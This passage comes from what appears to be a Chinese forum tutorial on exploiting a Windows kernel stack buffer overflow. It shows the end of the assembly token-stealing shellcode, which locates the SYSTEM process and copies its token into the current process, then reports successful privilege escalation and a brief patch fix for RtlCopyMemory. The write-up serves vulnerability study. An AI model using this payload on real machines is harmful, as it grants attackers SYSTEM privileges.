           sub eax, FLINK_OFFSET
           cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId，PID_OFFSET=0xb4
           jne SearchSystemPID              ;遍历链表根据PID判断是否为SYSTEM_PID(0x4)
       //替换token
       mov edx, [eax + TOKEN_OFFSET]        ; 获得系统进程token  。TOKEN_OFFSET=0xf8
       mov [ecx + TOKEN_OFFSET], edx        ; 系统进程token替换当前进程token
 
       ; End of Token Stealing Stub
 
       popad                                ; Restore registers state
 
       ; Kernel Recovery Stub
       xor eax, eax                         ; Set NTSTATUS SUCCEESS
       add esp, 12                          ; Fix the stack
       pop ebp                              ; Restore saved EBP
       ret 8                                ; Return cleanly
   }

```

运行 exp，windbg:

 

![](https://img-blog.csdnimg.cn/img_convert/90e34c340263a564273df7ea3715ecf6.png)

 

提权成功：

 

![](https://img-blog.csdnimg.cn/img_convert/8c95c90ecc50259d877f6742011110e7.png)

[](#五：补丁分析)五：补丁分析
-----------------

对 RtlCopyMemory 的参数进行严格的设置，使用 sizeof(kernelbuffer)

[[培训] 优秀毕业生寄语：恭喜 id 咸鱼炒白菜拿到远超 3W 月薪的 offer，《安卓高级研修班》火热招生！！！](https://zhuanlan.kanxue.com/article-16096.htm)

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#缓冲区溢出](forum-150-1-156.htm) [#Windows](forum-150-1-160.htm)